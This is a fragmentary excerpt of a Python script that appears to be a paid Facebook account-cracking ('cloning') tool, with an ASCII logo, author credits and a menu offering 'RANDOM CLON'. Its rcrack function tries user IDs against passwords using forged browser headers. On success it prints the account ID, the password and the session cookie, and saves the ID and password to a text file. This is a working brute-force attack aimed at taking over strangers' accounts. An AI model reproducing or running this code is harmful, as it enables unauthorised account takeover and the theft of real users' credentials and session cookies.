...
░▒▓███████▓▒░ ░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
----------------------------------------------
 \033[1;34mAuthor    : SULIAMAN BAGHLANI 
 \033[1;93mGithub    : SULIAMAN-BAGHLANI
 \033[1;96mFacebook  : RAYEES SULIAMAN BAGHLANI 
\033[1;94m Tool Name : RAYEES SULIAMAN PJR 
\033[1;96m Type type : PAID
\033[1;98m Version   : 0.1
----------------------------------------------
\033[1;97m====================================================""")             
...
def riaz():
	os.system('clear')
	print(logo)
	print('\33[1;34m[1] RANDOM CLON')
	print('\33[1;34m[2] SUB MY YOU TUBE')
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print(' \33[1;34mEXAMPLE : 2000,3000,5000,10000')
    lines()
...
def rcrack(uid,pwx,tl):
    ...
    'accept-language': 'fa-AF,fa;q=0.9,en-AU;q=0.8,en;q=0.7,en-US;q=0.6',
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SULIAMAN-OK] '+cid+' | '+ps+'\033[0;97m\n[💔]\033[0;37m COOKIE = \033[1;35m'+coki+  '  ''  \033[0;96m')
                open('SULIAMAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
